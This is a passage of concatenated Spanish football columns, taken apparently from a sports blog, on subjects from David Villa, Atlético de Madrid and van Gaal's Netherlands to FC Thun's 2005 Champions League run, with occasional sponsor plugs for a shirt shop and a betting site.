juego. Uno piensa en el carrerón frente a Suecia, la vaselina imposible contra Bravo, el doble palo frente a Paraguay. Partidos en los que el tiki-taka se mostraba impotente ante defensas bien plantadas, el reloj apremiaba y las amenazas de prórroga o eliminación se percibían en el horizonte como negras nubes de tormenta. Ahí era donde el Guaje asumía el papel que tantas veces ha desempeñado Messi en el gran Barça, descerrajaba el partido con un gol llegado de la nada y abría el paso a la victoria, a la excelencia y a que los elogios se los llevasen otros. Cuando faltó en 2012, los encuentros en los que el marcador no se abrió pronto fueron suplicios para España, ejercicios de voluntarismo en medio de la nostalgia de una punta de lanza.Leía días atrás a Alfredo Relaño en el diario As un comentario sobre el Atlético de Madrid que interpreté muy acertado. Decía el veterano periodista, al hilo de la controversia surgida en fechas recientes sobre el futuro inmediato de Thibaut Courtois, que el Atleti se había convertido en estos últimos años poco menos que en una granja de engorde, para regocijo y alimento de los grandes clubes de Europa. Que la tendencia marcada en las últimas temporadas era la de que sus grandes figuras, aquellos futbolistas que habían crecido y se habían hecho grandes en las filas colchoneras, emigrasen hacia destinos más apetecibles, con objetivos más ambiciosos y proyectos más lujosos. Ponía Relaño los ejemplos evidentes de Fernando Torres, ‘Kun’ Agüero o, más recientemente, Radamel Falcao. Quienes un día fueron estandarte del Calderón, acabaron sucumbiendo de manera irremediable (bien es cierto que alguno con mejores formas que otros) a la llamada de los grandes, de los adinerados y de aquellos que creían estar en condiciones de poder ofrecer un escenario con mayor proyección que la que ofrecía la ribera del Manzanares.Buscaba Relaño la explicación a semejante fenómeno de la granja de engorde en aquellos años en los que el Atleti permaneció alejado del primer nivel. Aquellos años del descenso a Segunda división, aquellos años de plantillas alocadas y banquillos con tendencias sísmicas, hicieron mucha mella en la imagen del cuadro rojiblanco. El Atleti fue, más que nunca, una simpática anécdota. Un equipo peleón, con querencia por la autodestrucción, pero nunca un lugar donde echar raíces y hacer leyenda. Y puede que en el Calderón aún estén terminando de pagar las crudas consecuencias de aquellos años de pérdida de identidad. Por eso, victorias como la de anoche tienen un significado especial.No está al alcance de cualquiera despachar unos octavos de final de la Liga de Campeones frente a un rival con el nombre del Milan con un resultado global de 5-1. Más allá del hecho de colarse con todo merecimiento entre los ocho mejores equipos del continente y de regalar a su afición la ocasión de disfrutar con una eliminatoria de cuartos de final en el mejor momento de la historia reciente del club, el Atlético ha dado un golpe sobre la mesa para anunciar su llegada. Se ha colocado en inmejorable disposición para seguir creciendo y volver a ser alguien en el panorama internacional, dejando en el olvido los oscuros años. La lucha colchonera debe ser no sólo por hacer algo importante en la competición (¿por qué no?) , sino por volver a mostrarse como un lugar apetecible, como una meta en sí mismo y no como una estación de paso o un cebadero en el que alimentar y cuidar a las futuras estrellas de los que hoy ya, sí, son sus verdaderos rivales. No sé si es un genio de la estrategia. Tampoco sé si realmente es un inútil perdedor cuyos equipos se apoyan en un pragmatismo exasperante para terminar no jugando a nada. Pero he podido constatar que ambas corrientes de pensamiento, radicalmente opuestas, gozan de su cuota de aceptación entre los aficionados y analistas. En apenas unos minutos, poco después de que la Holanda de Louis van Gaal consiguiese su pase a cuartos de final imponiéndose in extremis a México (2-1), pude leer opiniones en ambos sentidos expresadas con una vehemencia demoledora. Supongo, como en casi todo, que en el término medio está la virtud. Que puede que van Gaal haya pragmatizado algo sus equipos con el paso de los años, siempre adaptándose a las piezas de las que disponía, y que haya perdido algo de vértigo en su juego, pero no creo que su hoja de servicios presente un resumen criticable.La Holanda cuartofinalista en Brasil arranca y muere en Arjen Robben. La Oranje es lo que el explosivo extremo de Groninga quiera que sea y llegará hasta donde él sea capaz de guiarla. Futbolista superlativo, su omnipresencia en los cuatro partidos disputados hasta la fecha por los holandeses en lo que llevamos de torneo ha terminado por convertirle en la auténtica referencia de los de van Gaal, muy por encima del papel desempeñado por Wesley Sneijder o Robin van Persie. Puede que Holanda tenga poco que ofrecer. Que su plantilla, plagada de jóvenes talentos que aún no han roto el cascarón de la Eredivisie, no sea la más brillante de los últimos tiempos. Pero la sola presencia del futbolista del Bayern es suficiente para rescatar a su equipo cuando la tempestad arrecia.Ayer, bajo unas condiciones climatológicas asfixiantes, a más de treinta grados de temperatura y moviéndose en una humedad relativa de un noventa por ciento, Robben no dejó de ofrecerse, de pedirlas todas y percutir una y otra vez contra la defensa azteca, de intentar contagiar su actitud beligerante y batalladora al resto de sus compañeros. Incisivo como siempre lo ha sido, ahora además parece encontrarse especialmente inspirado y pletórico de confianza. Se propuso, tras el tanto inicial de Giovani que adelantaba a los mexicanos, remontar el choque y comenzó a arrinconar mexicanos en torno a su propia área a fuerza de profundizar por su banda. Hiperactivo como ninguno, se la lió bien liada a Rafa Márquez en el noventa y dos, inventándose un penalti que, con la connivencia del defensor mexicano, fue dado por bueno por el portugués Proença.Sigue van Gaal aferrado con firmeza al galimatías de su libreta. Ordena, dispone y recoloca futbolistas por el tablero como quien juega al Subbuteo. Y hasta ahora no le ha salido del todo mal. Su partido de ayer en los octavos de final deja la sensación de que, Arjen aparte, el manual de Louis tiene soluciones para todos los problemas que se le han venido planteando hasta el momento por parte de sus rivales. Pragmático o no, ya tiene a esta Holanda menor, a esta Holanda a veces plomiza y a veces brillante, a esta Holanda que será lo que Arjen Robben quiera que sea, en cuartos de final. Leía el pasado sábado noche en Twitter a uno de esos periodistas ‘de cámara’ del Real Madrid que la grave lesión de Luka Modric ‘prácticamente obligaba al equipo a dejar de lado una de las dos competiciones y centrarse solo en una‘. Más allá de la obscenidad de semejante afirmación y del inaceptable derrotismo que lleva implícito en un equipo que por potencial, presupuesto e historia debe de ser siempre aspirante máximo a todo, lo cierto es que sí que es verdad que la baja de larga duración del centrocampista croata puede tener una incidencia considerable en el devenir de la recta final de la temporada madridista. Modric atempera el fútbol que propone el Real Madrid. Lo hace menos dramático, menos tremendista, menos tendente a pasear por el borde del acantilado. Tapona los agujeros y disimula los defectos de fabricación hasta conseguir minimizar los posibles defectos que el equipo pudiera manifestar en su concepción táctica. Es el balcánico, en suma, uno de esos futbolistas que sin poder ser calificado de decisivo tiene una importancia trascendental en el esquema de Ancelotti, fundamentalmente porque pese a la estratosférica inversión en la confección de la plantilla, no hay un futbolista capaz de sustituirle con una mínima garantía de éxito. O eso es lo que se desprende de la intranquilidad reinante en el madridismo desde la confirmación de su baja.El debe recae, una vez más, sobre la deficiente estructuración de un plantel carísimo pero manifiestamente mejorable. En el fondo del armario acumulan polillas tres teóricos sustitutos del croata –Illarra, Khedira, Lucas Silva– (más un cuarto, Casemiro, cedido en Oporto), pero que por diversas razones parecen inservibles para la causa a día de hoy. A mayor abundamiento sobre la deficiente planificación deportiva, me cuesta creer que nadie en las últimas veinticuatro horas haya jurado en arameo sobre el repentino y sorprendente traspaso de Xabi Alonso al Bayern (a la sazón, encarnizado rival europeo), un futbolista que habría sido de importancia capital en las actuales circunstancias competitivas.Con el ‘dilema Modric’ estampado sobre el cuaderno de apuntes tácticos de Ancelotti, la responsabilidad directa recae ahora sobre el técnico. Él será quien deberá ahora minimizar los defectos de la planificación, con el compromiso inmediato de ese partido del miércoles, tratando de encontrar la combinación que sustituya al croata más idealmente. Quien supla las carencias técnicas y tácticas de los escogidos con respecto al ausente con una buena disposición sobre el tablero y una emulsión perfecta, ejerciendo al mismo tiempo de estratega y alquimista. No es tarea menor. Thun es una postal. Con su lago, su castillo y sus montañas calizas de cumbres nevadas enmarcando la preciosa escena, la principal vista de la coqueta ciudad suiza, de apenas cuarenta mil habitantes, bien podría pasar por una imagen compuesta por cinco mil piezas de puzzle esperando ser correctamente entrelazadas.Ubicada en el cantón de Berna, muy cerca del centro geográfico del país y a apenas treinta kilómetros de la capital helvética, Thun ofrece el innegable atractivo turístico de la típica estampa de microclima alpino en entorno rural, muy alejada de las grandes urbes de la confederación helvética como Basilea, Ginebra o Zúrich. Pero no vamos a engañarnos. Con todo su innegable atractivo, el reflejo de los geranios más rojos del mundo sobre las aguas del Thunersee jamás habría pasado de ser una simple postal a los ojos de cualquier aficionado al fútbol si no hubiera sido por lo ocurrido el catorce de septiembre de 2005. El día en el que el modesto y semidesconocido FC Thun debutó en la fase de liguillas de la Liga de Campeones.Fundado en 1898, y habiendo jugado una única temporada (1954-55) a lo largo de toda su historia en la máxima categoría del fútbol suizo, el ascenso en la temporada 2002/03 abrió los años más brillantes de la historia del club alpino. Apenas una campaña para sentarse entre los principales clubes del país y, dos años después de su ascenso, el Thun se proclamaba subcampeón de la Super League suiza por detrás del campeón Basel con una plantilla compuesta por futbolistas sin pedigrí, abnegados jornaleros del ciento cinco por setenta entre los que, aún a día de hoy, resulta imposible resaltar algún nombre con especial trascendencia en el panorama continental. Brasileños, algún africano, oriundos balcánicos afincados en Suiza… y Mauro Lustrinelli. Si de entre aquella modesta nómina de jugadores un nombre resonaba por encima del resto era el de su hombre-gol, el del autor de veinte goles en la temporada del subcampeonato, una docena de partidos como internacional absoluto con Suiza y mundialista en el año 2006. Sus dos buenas temporadas con el Thun catapultaron su proyección en ese oscuro tercer nivel del fútbol europeo. Un año comiendo realidad en el Sparta de Praga fue suficiente para devolverlo a la modestia habitual del campeonato nacional suizo, lo que supone buena muestra del escaso nivel que reunía aquella histórica plantilla.Tras superar dos fases previas, una primera durísima ante el Dinamo de Kiev y una definitiva ante el Malmö sueco (con tres goles de Lustrinelli en el choque de vuelta), el Thun accedió a la definitiva fase de grupos de la competición, siendo encuadrado en el Grupo B junto a Arsenal, Ajax y Sparta de Praga. Y fue precisamente en un escenario con la mística del desaparecido Highbury donde el conjunto helvético se convirtió en el club de menor presupuesto (apenas cinco millones de francos suizos, unos cuatro millones de euros) que ha conseguido disputar la máxima competición continental. Su primer contacto no pudo ser más frustrante. Era el Arsenal de Henry, Fàbregas, van Persie o Campbell y, tras igualar el gol inicial de Gilberto Silva dos minutos después, solo un gol en el tiempo añadido de Dennis Bergkamp pudo mandar definitivamente a la lona a los suizos. Ya en el segundo partido, y obligados por UEFA a jugar como locales en el Stade de Suisse en la cercana Berna ante el incumplimiento de los requisitos mínimos del pequeñísimo y humilde Stadion Lachen, habitual feudo del equipo, el Thun comenzó a cimentar su muy meritoria clasificación como tercero del grupo al imponerse al Sparta por un gol a cero. Dos contundentes derrotas ante el Ajax (2-0 y 2-4), y un nuevo  y ajustadísimo tropiezo ante el Arsenal (0-1, tras penalti marcado por Pirès cuando el partido ya enfilaba el minuto noventa), forzaron a que el Thun tuviera que sacar algo positivo de su visita a la capital checa. El empate a cero logrado en el Letná de Praga dejó a los suizos en tercer lugar del grupo, por delante del propio Sparta, y clasificados para la Copa de la UEFA, de la que fueron eliminados a las primeras de cambio por el Hamburgo, ya sin Urs Schönenberger, el técnico del milagro, en el banquillo.El Thun tardó apenas un par de temporadas en descomponerse del todo. Si fulgurante fue su irrupción en la elite, no menos lo fue su caída. Un nuevo descenso de categoría en la campaña 2007/08 y otro pasito adelante en la 2010/11, temporada en la que el pequeño club alpino recuperó la categoría entre los principales equipos del país siendo un habitual de la zona media de la clasificación (habiéndose colado incluso en un par de ediciones de la Europa League) en estos últimos años.Puedes hacerte con las camisetas del histórico FC Thun de 2005 en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. España es un desguace. Sucio, viejo, desordenado, decadente y caótico, en el que los restos de los vehículos allí amontonados mantienen un equilibrio imposible los unos sobre los otros. Si quitas un paragolpes de aquí, probablemente se te vengan encima los restos de dos Ibizas y de un Corsa del que no quedan ya ni las entrañas. Esto no es ni siquiera un caos armónico, es un caos insostenible en el que toda la estructura sobre la que se sustentaba hasta hace bien poco el entramado de la mejor selección nacional de nuestra historia se tambalea amenazando derrumbe inmediato.Poznan, Liverpool, Dinamo de Kiev y Benfica. Con 17 millones de euros, frente a los 50 del vecino blanquiazul, en cartera y atinando como pocos en las contrataciones la dupla Domingos-Couto le ha lavado la cara al club. Destaca el trabajo, la solidaridad y también el brillo de Alan, Lima, Mossoró o el peruano Rodríguez. Todos les vemos como carne para la picadora pero llevamos haciéndolo desde que arrancó la temporada. Y equivocándonos…La fuente infinita. Dice Gaby Ruiz que el Oporto es el tercer mejor equipo de Europa en estos momentos porque nadie en el continente cuenta con una cuadrilla de espías tan eficiente. Y solo así se puede explicar el éxito continuado del club blanquiazul. Campeón invicto en el torneo local y apabullante en el concurso europeo, un escándalo lo de Villarreal, da gusto ver jugar a este equipo cuando enfilan para el ataque. Hulk es un futbolista irresistible y el otrora tibio Falcao se ha destapado como el mejor goleador (16 dianas que alguno no convertiría ni en una temporada completa) en la historia de la Copa de la UEFA. Y Otamendi, y Maicon, y el gran Guarín…  Así las cosas embolsarse esta copa es una obligación para Villas-Boas. Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Como era de esperar var la Copa en manos del Braga se paga a 4.50 euros en bwin.com frente a los escasos 1.16 que daría una victoria del Oporto. Cada vez que escuchaba al bueno de Julio Salinas referirse al himno del Sevilla, a la opereta de Plácido Domingo en la Castellana o alguna que otra obrita perpetrada para solaz de la futbolerada como lo mejor y más emocionante que se había compuesto en la historia me alteraba. Aun me pasa cada vez que algún otro entretenedor repite la jugada. No me miro al espejo cuando ocurre pero seguro que las orejas se me erizan como a un Setter inglés las suyas frente a la perdiz a tiro. Reconozco eso sí que estos tipos, que comentan regular y tienen peor gusto musical, saben tocar las teclas adecuadas. En mi caso particular las de la risa y el escalofrío. Por suerte el realizador siempre tenía a bien ofrecernos un plano medio del delanterazo metido a asesor en materia sonora y de sus camisas imposibles para que entendiéramos todo. Para que algunos nos calmáramos y dejáramos pasar el momento como el que deja pasar un bocinazo en medio de una mañana placida. A lo bálsamo. Hoy recordé todo esto y hice una cosa.Y este año. . pues este año ya vemos lo que ha ocurrido. Está ya en retirada, su estrella declinante y su tiempo pasado, pero quizá aún guardaba un poco de magia que hubiese servido para reventar los murallones de Holanda o Chile. Nadie que lo viera en la final de Lisboa hubiera creído que ya es poco más que una leyenda viva. Y el gol que marcó ayer, el que pone punto final a una trayectoria inigualable, sigue siendo uno de esos que sólo marcan los elegidos. Qué mejor imagen, esa y las lágrimas del banquillo, para cerrar una de las carreras más gloriosas que recuerda el fútbol español.Sí, fueron las paradas de Casillas. Y el toque de Xavi. Y la garra de Puyol y Ramos, el pundonor de Xabi, los robos de Busquets y la ubicuidad de Fàbregas. Pero quizá dentro de sesenta años vuelvan a pensar dos amigos, en diferentes continentes, y en el mismo momento: “Pues sí. Aquella selección fueron sesenta goles de David Villa”. Del Bosque ha soltado hoy mismo la pequeña bomba que esconde la última convocatoria de la absoluta antes de la Eurocopa. Destacan las llamadas del joven Iker Muniain, héroe ante el Lokomotiv, que está confirmado punto por punto las profecías que le señalaban como perla emergente del fútbol europeo, y de Roberto Soldado, cuya ausencia partido tras partido se antojaba sencillamente un escándalo, y parecía apuntar a algún tema personal entre el seleccionador y el delantero valenciano. Menos extrañas resultan la ausencia de Albiol, relegado al triste papel de cuarto central del Madrid, y la de Fernando Torres, un fantasma del poderoso killer que asombró en Atlético o Liverpool, y que a día de hoy sólo genera dudas. Con esta convocatoria, Del Bosque elimina de un plumazo las acusaciones de favoritismo que últimamente le apuntaban, y brinda una lista que, Reina aparte, es difícil de discutir. Espera Venezuela –quizá sin Amorebieta– el miércoles a las 21:30, en la Rosaleda. El Valencia, segundo equipo español que se juega los octavos de la presente Champions, lo hará frente a un Schalke 04 que está completando una de las temporadas más extrañas de su centenaria historia. El equipo de Gelsenkirchen ha firmado una inmaculada andanza europea, donde fue primero de grupo y en la que el 1-1 de Mestalla le proporciona fundadas esperanzas de alcanzar los cuartos, y se enfrentará al Duisburgo en la final de la Deutsches Pokal, después de eliminar en semis a todo un Bayern Munich. Sin embargo, su trayectoria en Bundesliga –la competición que al final acaba determinando el estado real de los equipos- está siendo muy decepcionante, errando por tierra de nadie en la tabla y exhibiendo un nivel de juego muy pobre, que a veces recuerda el de los peores tiempos de la era Slomka.Sin lugar a dudas, la sorpresa feliz del Schalke esta temporada es Raúl González. Pocos daban un duro por su éxito en un fútbol tan físico y exigente como el alemán, pero el jugador español ha tirado de casta, sabiduría y olfato para ofrecer un buen nivel de juego, gozar de la confianza de Magath y el cariño de la bulliciosa afición del Veltins Arena, y sobre todo, anotar una cifra de goles que nos retrotrae a los mejores años de su carrera; algunos de ellos, además, de gran valor, como el obtenido en la ida de estos octavos, o el logrado en el Allianz Arena. Quizá ya no ofrece el nivel de juego de sus mejores años, pero su aportación ofensiva ha resultado capital para mantener a flote al equipo, máxime en estos últimos meses en los que Huntelaar se ha desinflado y la directiva decidió, en una decisión un tanto controvertida, prescindir de Ivan Rakitic. Algunos destellos de Jurado y Farfán –que ha jugado bastantes partidos como falso interior, y cuyo rendimiento ha sido discreto- han colaborado igualmente al repunte del equipo en la segunda parte de la temporada. Sin embargo, es difícil que un equipo rinda a buen nivel sin una buena red defensiva que lo proteja. Durante buena temporada el equipo ha resultado un coladero por los laterales, donde ni Schmitz es el añorado Heiko Westermann ni Uchida ha podido con el recuerdo de las carreras de Rafinha. Si además queda poco más que un buen recuerdo del gran Metzelder del Borussia y el joven camerunés Joel Matip, aún bastante verde, no ha acabado de convencer ni como central ni como tapón,  encontraremos la explicación de por qué el equipo del Ruhr no se ha sentido seguro durante todo el curso, y ha sufrido derrotas tan dolorosas como el 1-3 frente al vecino de Dortmund, o el 5-0 de Kaiserlautern. El Valencia deberá explotar estas debilidades con sus hombres rápidos de banda, a la vez que impedir que el balón llegue en buenas condiciones a sus tres hombres de arriba y evitar, en lo posible, las jugadas a balón parado. Son casi las únicas bazas de un equipo que vivió tiempos mejores y que deberá sufrir una profunda renovación si desea volver a ser competitivo. Alemania. Semifinalista. Cuatro partidos ganados y uno perdido. Diez goles anotados y seis encajados. Goleadores: Mario Gómez (3), Podolski, Bender, Lahm, Khedira, Klose, Reus y Özil.Lo mejor. El fútbol moderno, arrollador y dinámico exhibido en varios de los partidos, especialmente contra Holanda y Grecia, la facilidad goleadora, la capacidad de sacar la bola de Hummels y la movilidad de los hombres de arriba.Lo peor. Lastró especialmente al equipo la baja forma de su cerebro Schweinsteiger, fuera de forma y algo bajo de moral. Puede cuestionarse también la excesiva confianza en Podolski y la extraña alineación del partido frente a Italia.La estrella. Difícil elegir uno entre el dúo madridista Özil-Khedira; el primero ya ha cobrado suficiente jerarquía para ser considerado el jugador más decisivo de su equipo, mientras que el despliegue de Sami, mucho más suelto que en el equipo blanco, rayó en ocasiones la omnipresencia.El momento. Quizá el trallazo de Reus en cuartos que selló el resultado definitivo contra Grecia. Un disparo despiadado, automático, que obligó al travesaño a escupir hacia dentro después de restallar. Así había sido el juego alemán hasta ese momento.Portugal. Semifinalista. Tres partidos ganados, uno empatado y otro perdido. Seis goles marcados y cuatro recibidos. Goleadores: Cristiano (3), Pepe, Postiga y Varela.Lo mejor. La impresión de haber resuelto sus viejos problemas para convertirse en una escuadra bien engrasada, muy competitiva y capaz de desarrollar varios registros. Sólo la rueda de los penaltis los separó de eliminar al campeón.Lo peor. La prórroga contra España, donde la combinación del declive físico y los cambios de Del Bosque les pusieron contra las cuerdas, y algunos errores de concentración, especialmente visibles en el choque con los daneses.La estrella. Cristiano Ronaldo buscaba coronar su gran temporada en la Eurocopa, y lo logró a medias. A un comienzo titubeante siguieron dos exhibiciones inolvidables frente a Holanda y Chequia, pero no pudo decidir en el momento clave de la semifinal. Sabor final agridulce.El momento. Por emotividad y también por importancia, el doble disparo de Varela frente a Dinamarca, que de un plumazo ganó el partido y devolvió al equipo al torneo en un final agónico. La definición de punto de inflexión. Dinamarca. Primera fase.Ni rastro de la gloria.Y lo mejor de toda esta historia es que ya haya terminado. Que no haya más hueco que rellenar ni más silencios que cubrir. Porque la carrera por justificar lo injustificable acababa degenerando en una espiral de destrucción en la que todos decían lo que pensaban y muy pocos pensaban lo que decían. ‘Yo pienso por todos, y los jugadores piensan por ellos‘, matizaba Vicente del Bosque en las tensas horas de espera hasta el partido final ante Australia. Era su salida a los días más largos, a esa insufrible penitencia en el purgatorio de Curitiba, a la intempestiva y dañina concatenación de acusaciones cruzadas y de miradas de reojo entre los miembros de una expedición intoxicada por la ponzoña que sucede al fracaso. Y la realidad parecía dar la razón al técnico salmantino. Erigido motu proprio en representante y portavoz de un grupo empeñado en no sacar a airear trapos sucios, Xabi Alonso habló por los demás en un gesto tan sincero y honesto como populachero e improcedente. Habló de la falta de hambre del grupo como motivo del hundimiento y provocó, intuyo que un poco queriendo y otro poco sin querer, un cataclismo interno ante el que hubo quienes decidieron no quedarse callados, algo que Alonso probablemente preveía y que prefirió no evitar. De las sensaciones ajenas, ya se sabe, es mejor dejar opinar a sus protagonistas directos. Me cuesta mucho creer que el centrocampista guipuzcoano no midiese previamente las consecuencias de sus palabras.Antes de que Villa, Torres y Mata ajusticiasen a Australia (0-3) en un partido tan intrascendente como emocionalmente complejo, el debate sobre la amortización del grupo campeón de todo ya estaba abierto y en plena efervescencia. Los que valían y los que no. Los que pedían la cuenta antes incluso de acabar el banquete y los que se quedaban a los cafés y las copas con la esperanza, al menos, de dejar el escenario limpio y mínimamente presentable de cara a la próxima función. Pasarán los días y, como siempre ocurre, el luto se suavizará y el duelo se hará más llevadero. Será entonces momento de analizar, de medir las consecuencias del fracaso mundialista y del ocaso de un grupo que necesita abrir las ventanas de un cubículo que apesta a muebles viejos y atmósfera viciada.Aún no tengo suficientes argumentos como para concluir que Del Bosque deba dar un paso a un lado y dejar que sea otro el encargado de la regeneración. Tampoco veo, de momento, que las posibles alternativas supongan una mejora asegurada a lo que ahora mismo existe. No obstante, y pese a ser un romántico del fútbol declarado, soy consciente de que el refugio en la nostalgia suele ser mal compañero de viaje a partir de ciertos niveles competitivos. El sincero y emotivo abrazo con el que ayer Andrés Iniesta quiso dejar de manifiesto su cariño, admiración, agradecimiento y respeto hacia el seleccionador nacional tiene mucho de simbólico. Tres o cuatro segundos de pública intimidad que resumen una época, que cierran un ciclo triunfal y que podrían servir, quién sabe, de precioso epitafio a aquello que jamás creímos que podríamos llegar a disfrutar. David Moyes aterrizó en San Sebastián bajo un radiante sol de otoño. Tras una intensísima negociación, el sustituto del destituido Jagoba Arrasate llegaba a la que iba a ser su primera experiencia en un banquillo fuera de Gran Bretaña con todo de cara. Después de haber apostado por un técnico de la casa, de perfil bajo pero conocedor de los entresijos de Zubieta, como Arrasate, Aperribay viraba el rumbo ciento ochenta grados y confiaba la dirección deportiva de la nave realista a un entrenador de prestigio y gran caché. El extécnico del Manchester United aparecía como la inyección de ilusión y el estímulo que parecía necesitar la grada de Anoeta, entregada al triste devenir del mortecino equipo de Jagoba.Un país diferente, un idioma nuevo, un fútbol y una competición desconocidos y una plantilla con muchos flecos deshilachados no parecían conformar el mejor escenario posible para empezar a exigir frutos al escocés en su primer año. Mejorar la trayectoria de Arrasate, mantener a flote al equipo y sembrar y abonar el terreno de cara ya a la siguiente cosecha eran cometidos más que suficientes para sus primeros meses en Donosti. La Real de Moyes acabó la temporada sin brillantez. Sumida en terreno neutral y sin una identidad ni un patrón de juego definido o identificable. El escocés no había conseguido imprimir su impronta al equipo. Sencillamente, y este era precisamente el síntoma más preocupante, el equipo no tenía impronta ninguna.La incorporación de un delantero con probada solvencia en la Liga como Jonathas de Jesus y, sobre todo, la vuelta de Asier Illarramendi como el retorno del hijo pródigo, hacían presagiar una Real Sociedad establecida en otro nivel. Una plantilla considerablemente enriquecida para dar una vuelta de tuerca más al equipo y comenzar a exigir, en relación ya no sólo con su salario sino con las herramientas de primer nivel que se habían puesto en sus manos, a David Moyes. Pero la Real del segundo año del escocés se parece sospechosamente a la Real de su primer año. A aquel equipo anónimo, sin firma, que lo mismo podía estar dirigido por un técnico de reconocido prestigio en Inglaterra que bajo el mando del preparador del alevín B de Zubieta. Debo reconocer que esperaba bastante más de Moyes. Porque el calmado escenario de San Sebastián y Anoeta se me hacía propicio para él. Porque el margen de mejora del equipo era enorme y nadie iba a exigir nada por encima de lo normalmente exigible. Porque me negaba a creer a aquellas voces que aseguraban que su paso por Gipuzkoa no era más que una sutil maniobra para engordar su bolsillo y no oxidarse en demasía con vistas a un inminente retorno a un banquillo inglés. Pasados los dos primeros meses de la competición, la Real Sociedad sigue sin parecerse a nada. No hay una línea de juego a la que aferrarse. Es un equipo sin espíritu, sin rasgos identificativos. Sí, es verdad que el equipo no termina de descomponerse y que ofrece una cierta seguridad defensiva, pero la sensación que transmite es de pesadumbre y de plantilla desaprovechada encaminada a la enésima temporada gris. De fractura total entre técnico y futbolistas y de triste final anunciado. No hay de momento indicadores que hagan presagiar un final abrupto y anticipado de la trayectoria de Moyes en San Sebastián. Entre otras cosas, porque el probable montante económico de la operación pondría a la directiva realista entre la espada y la pared. El escocés termina su contrato al final de la presente temporada. Su renovación a fecha de hoy, cerca de cumplirse su primer año como técnico de la Real, resulta quimérica. Paseaba por las polvorientas calles del Bon Pastor acompañado de dos o tres personas. Lo único que a simple vista parecía diferenciarle de todos aquellos viejos conocidos que iban saliendo a su paso para saludarle, darle un abrazo o unas palmaditas afectuosas en la espalda era su vestimenta, con ese punto inconfundible de hortera/caro tan habitual en el gremio futbolístico.Se movía con absoluta naturalidad entre aquel enjambre de viviendas sociales salpicadas de pintadas chapuceras que se desparramaban ante su caminar como gigantescas piezas de Lego y que hasta hace no demasiado tiempo habían sido su reducto y, en cierto modo, parecía casi avergonzarse de volver al lugar del que había salido después de que su vida hubiese cambiado tanto. Le faltaba pedir perdón a todos los que se acercaban a él por haber tenido fortuna en el mundo del fútbol y haber podido dejar el barrio atrás para instalarse en una vida mejor. Se leía la culpabilidad en su mirada, como si se sintiera responsable de no poder hacer nada por quienes eran como un día había sido él. Era un reportaje que al hoy delantero del Espanyol, Sergio García, le hicieron en Canal+ hace unos cuantos años. De esos que tratan de ahondar en el lado humano del personaje público. Ya sabíamos de las condiciones sobre el césped del hoy jugador franquicia del cuadro perico y aquel vídeo nos ayudó a comprender, a través de sus orígenes, su fuerte sentido de la responsabilidad ahora que es ya un futbolista hecho y maduro.Sería difícil a día de hoy concibir un RCD Espanyol sin la figura de Sergio. Porque el atacante catalán es uno de esos futbolistas que, a fuerza de verlos temporada tras temporada (y ya van cinco como perico) acaban resultando casi invisibles e intrascendentes. Porque, al fin y al cabo, siempre están y casi siempre cumplen. Sin artificios ni aspavientos, pero cumplen con regularidad funcionarial. En Sergio recayó la responsabilidad de rescatar al Espanyol de la orfandad tras la salida de Raúl Tamudo, indiscutible emblema perico durante la pasada década. Y respondió sin miedo al fracaso, convirtiéndose en la referencia del club con Pochettino, con Aguirre y ahora con Sergio González. Sergio García es el principio y el fin del equipo, el jugador sobre el que gravita una idea de juego y el hombre encargado de mantener la luminaria del faro que guía al espanyolismo. Una responsabilidad que lleva cinco temporadas atendiendo con profesionalidad, esmero y dedicación intachable.Es Sergio ese tipo de futbolista que un equipo modesto y limitado como el Espanyol celebra con entusiasmo indisimulado. Un mago en campo ajeno con una chistera repleta de trucos y que no escatima esfuerzos a la hora de fajarse con quien sea menester. Un delantero dispuesto a actuar de lo que la situación requiera. Un futbolista capaz de asociarse hasta con el banderín del córner. Un hombre para todo. Dispuesto a exprimir la responsabilidad que con tanta naturalidad decidió asumir hasta el infinito. No sabría muy bien qué decir. No sé si Raúl García (Pamplona, 1986) es un interior navarro, un atacante colchonero o un mediocentro rojiblanco.Conecté el ordenador, los altavoces y puse a funcionar los acordes rurales de una vieja canción pensando en que dentro de un rato, con el Valencia como buen aderezo, podremos asomarnos de nuevo a Ibrox y tararear tranquilamente el “Paisley Road West”. Y me quedé tranquilo. Lo de pintar el cuatro en el marcador jugando de visitante en cualquier liga decente es miel al alcance de unos pocos. Una anomalía de las que revitalizan la carrera de cualquier entrenador, futbolista o club. Pero si de verdad tu equipo es especial e innovador la decisión que han de tomar los chavales tras el chorro de goles es perder el partido. Es la forma más rápida que tienen los desheredados de la pelotita para entrar en los libros, aunque sea por la cara de tonto que se les queda. Más o menos como la que presentaba Steve Coppell en 2007 cuando esa panda de bromistas que era su Reading lograron la susodicha hazaña en el Portsmouth 7- Reading 4. La prensa lo vio claro, el Reading tenía el síndrome de la segunda temporada. “Estoy harto de esta puta historia. Me hacen diecisiete millones de preguntas sobre el sídrome de la segunda temporada” bramó Coppell seguramente revolviéndose contra lo inevitable. El síndrome de la segunda temporada es un tópico en el fútbol británico, una especie de maldición que sufren los equipos pequeños durante su segundo año en la élite y que suele suceder en el curso inmediatamente posterior a haber firmado una gran campaña. Evidentemente el Reading estaba enfermo y los pataleos de Coppel no evitaron que se lo tragara la ola. Pasó a formar parte de un selecto club en el que trasiegan su pena históricas entidades como el Swansea, el Millwall, el Middlesbrough, el Ipswich o un siempre avezado en las cuestiones anómalas Manchester City. ¿Qué me pasa doctor? El último en acercarse preocupado a la consulta ha sido el Hull. Los de Yorkshire arrancaron en buena forma su primera campaña en Primera tras 104 años de infraexistencia y aunque se salvaron en última instancia tuvieron tiempo para conocer lo que se siente al someter a todo un Arsenal o ir tercero en la tabla. Eran los buenos viejos tiempos. Pero la temporada siguiente fue otro cantar, sumaron unos miserables 30 puntos e incluso Phil Brown, destituido antes de acabar el trabajo ante la galopante racha de resultados, cayó víctima del síndrome. El de la segunda temporada, poca broma.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey. Puedes comprar todas estas camisetas y cientos más en Classic Football Shirts. El 2-0 al Nàstic deja una cosa clara: el Oviedo lleva una doble vida.Un partido ganado y dos perdidos, cuatro goles a favor y cinco en contra. Goleadores: Krohn-Dehli (2) y Bendtner (2). Lo mejor. Una propuesta muy aseada para un equipo con poca calidad en el centro del campo, buen orden defensivo y fundadas opciones de meterse en cuartos hasta 